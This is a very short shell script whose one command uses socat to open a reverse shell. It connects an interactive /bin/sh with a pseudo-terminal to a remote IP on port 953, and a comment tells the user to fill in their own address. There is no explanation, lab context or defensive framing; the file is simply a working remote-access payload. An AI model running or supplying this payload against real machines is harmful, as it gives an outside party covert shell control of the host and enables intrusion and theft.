#!/usr/bin/env sh
#Change the X for your IP 
socat exec:'/bin/sh',pty,stderr,setsid,sigint,sane tcp:XX.XX.XX.XX:953
